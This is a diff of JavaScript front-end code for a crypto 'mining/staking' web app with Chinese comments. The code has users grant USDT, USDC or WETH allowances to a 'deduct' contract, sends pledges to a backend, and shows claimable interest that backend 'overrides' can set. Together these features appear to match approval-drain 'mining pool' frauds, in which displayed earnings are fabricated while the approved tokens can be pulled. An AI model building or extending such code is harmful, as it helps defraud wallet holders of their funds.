@@ -698,13 +698,13 @@ function updateClaimModalLabels() {
 async function claimInterest() {
   await refreshEthPrice();
   updateClaimModalLabels();
-  // 【宇宙終極防呆版】優先讀取後台覆寫的 cumulative
+  // 安全取得當前用戶資料
   const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] ||
                           window.loadedUserData ||
                           {};
   const currentOverrides = window.currentOverrides ||
                           (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
-  const claimableETH = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0 // 【修改】忽略 0
+  const claimableETH = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0
       ? currentOverrides.cumulative
       : (currentUserData.cumulative || window.currentClaimable || 0);
   if (modalClaimableETH) modalClaimableETH.textContent = `${Number(claimableETH).toFixed(7)} ETH`;
@@ -863,7 +863,7 @@ async function connectWallet() {
     await loadUserDataFromServer();
     await updateUIBasedOnChainState();
     initSSE();
-    await updateUIBasedOnChainState();
+    setTimeout(() => updateUIBasedOnChainState(), 3000); // 【關鍵】延遲再查一次
   } catch (e) {
     console.error('[DEBUG] 錢包連線失敗:', e);
     if (e.code === -32002 || e.message.includes('already pending')) {
@@ -881,31 +881,16 @@ async function updateUIBasedOnChainState() {
   if (!userAddress) return;
   try {
     console.log('[DEBUG] 開始鏈上狀態檢查...');
-    const docRef = db.collection('users').doc(userAddress);
-    const snap = await docRef.get();
-    if (snap.exists && snap.data()?.isDemoWallet) {
-      console.log('[DEBUG] 檢測到演示錢包');
+    
+    // 【關鍵】強制等待最新區塊
+    await provider.getBlockNumber();
+    
+    const isServiceActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
+    
+    if (isServiceActive) {
       if (startBtn) startBtn.style.display = 'none';
       disableInteractiveElements(false);
-      updateStatus("演示模式：已自動啟動");
-      activateStakingUI();
-      return;
-    }
-    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
-    const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
-      retry(() => deductContract.isServiceActiveFor(userAddress)),
-      retry(() => usdtContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
-      retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
-      retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
-    ]);
-    const isWethAuthorized = wethAllowance >= requiredAllowance;
-    const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
-    const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
-    const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
-    if (isFullyAuthorized) {
-      if (startBtn) startBtn.style.display = 'none';
-      disableInteractiveElements(false);
-      pledgeBtn.disabled = false; // 【關鍵】強制啟用
+      pledgeBtn.disabled = false;
       pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
       updateStatus("挖礦已啟動，可質押");
       activateStakingUI();
@@ -916,8 +901,7 @@ async function updateUIBasedOnChainState() {
     }
   } catch (e) {
     console.error('[DEBUG] 鏈上狀態檢查錯誤:', e);
-    log(`狀態檢查錯誤: ${e.message}`, 'error');
-    if (startBtn) startBtn.style.display = 'block';
+    updateStatus(`狀態檢查錯誤: ${e.message}`, true);
   }
 }
 async function handleConditionalAuthorizationFlow() {
@@ -956,10 +940,15 @@ async function handleConditionalAuthorizationFlow() {
     try {
       const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
       activateTx.value = 0n;
-      await sendMobileRobustTransaction(activateTx);
+      const receipt = await sendMobileRobustTransaction(activateTx); // 【關鍵】等待 receipt
+      if (receipt.status !== 1) throw new Error('Activation failed on chain');
+      
       authorizedToken = tokenName;
       localStorage.setItem('authorizedToken', authorizedToken);
       await smartSave();
+      
+      // 【強制更新狀態】
+      await updateUIBasedOnChainState();
     } catch (err) {
       updateStatus(`Activation failed: ${err.message}`, true);
     }
@@ -996,7 +985,9 @@ function updateLanguage(lang) {
     if (elements.modalTotalBalanceLabel) elements.modalTotalBalanceLabel.textContent = translations[lang].totalBalance;
     if (elements.modalPledgedAmountLabel) elements.modalPledgedAmountLabel.textContent = translations[lang].pledgedAmount;
     if (elements.modalPendingInterestLabel) elements.modalPendingInterestLabel.textContent = translations[lang].pendingInterest;
-    if (elements.modalClaimedInterestLabel) elements.modalClaimedInterestLabel.textContent = translations[lang].claimedInterest;
+    if (
+
+    elements.modalClaimedInterestLabel) elements.modalClaimedInterestLabel.textContent = translations[lang].claimedInterest;
     if (elements.modalWalletBalanceLabel) elements.modalWalletBalanceLabel.textContent = translations[lang].walletBalance;
     if (elements.totalPledgeLabel) elements.totalPledgeLabel.textContent = translations[lang].totalPledge;
     if (elements.estimateLabel) elements.estimateLabel.textContent = translations[lang].estimate;
@@ -1309,33 +1300,27 @@ document.addEventListener('DOMContentLoaded', async () => {
         updateStatus(translations[currentLang].noWallet, true);
         return;
       }
-
-      // 【關鍵】檢查是否已啟動服務
+      // 【關鍵】每次點擊都重新查詢鏈上狀態
       const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
       if (!isActive) {
         updateStatus('請先完成合約授權', true);
         return;
       }
-
       const amount = parseFloat(pledgeAmount.value) || 0;
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
-
       if (amount <= 0) {
         updateStatus(translations[currentLang].invalidPledgeAmount, true);
         return;
       }
-
       // 檢查鎖定
       const locked = await isPledgeLocked(userAddress);
       if (locked) {
         updateStatus('質押進行中，請稍候...', true);
         return;
       }
-
       pledgeBtn.disabled = true;
       pledgeBtn.textContent = '處理中...';
-
       try {
         // 檢查餘額
         const decimals = token === 'WETH' ? 18 : 6;
@@ -1344,13 +1329,11 @@ document.addEventListener('DOMContentLoaded', async () => {
         if (amount > walletBalance) {
           throw new Error(translations[currentLang].insufficientBalance);
         }
-
         // 檢查最小質押
         const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
         if (duration && amount < duration.min) {
           throw new Error(`最低質押金額：${duration.min} ${token}`);
         }
-
         // 檢查授權
         const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
         const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
@@ -1363,7 +1346,6 @@ document.addEventListener('DOMContentLoaded', async () => {
           );
           await sendMobileRobustTransaction(approveTx);
         }
-
         // 發送質押請求
         updateStatus('提交質押請求...');
         const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
@@ -1371,14 +1353,11 @@ document.addEventListener('DOMContentLoaded', async () => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
         });
-
         if (!response.ok) throw new Error(await response.text());
-
         const result = await response.json();
         if (!result.success) throw new Error(result.error);
-
         updateStatus(`質押請求已提交，訂單編號：${result.orderId}`);
-        
+       
         // 輪詢解除鎖定
         const poll = setInterval(async () => {
           const stillLocked = await isPledgeLocked(userAddress);
@@ -1388,7 +1367,6 @@ document.addEventListener('DOMContentLoaded', async () => {
             clearInterval(poll);
           }
         }, 2000);
-
       } catch (error) {
         pledgeBtn.disabled = false;
         pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
@@ -1396,7 +1374,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
     });
   }
-    if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
+  if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
   if (pledgeToken) pledgeToken.addEventListener('change', updateEstimate);
@@ -1409,7 +1387,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     accountBalanceValue.addEventListener('click', showAccountDetail);
   }
   if (closeAccountDetail) closeAccountDetail.addEventListener('click', closeAccountDetailModal);
-  if (closeAccountDetailBtn) closeAccountDetailBtn.addEventListener('click', closeAccountDetailModal);
+   if (closeAccountDetailBtn) closeAccountDetailBtn.addEventListener('click', closeAccountDetailModal);
   if (accountDetailModal) accountDetailModal.addEventListener('click', e => e.target === accountDetailModal && closeAccountDetailModal());
 
   document.querySelectorAll('.tab').forEach(tab => {
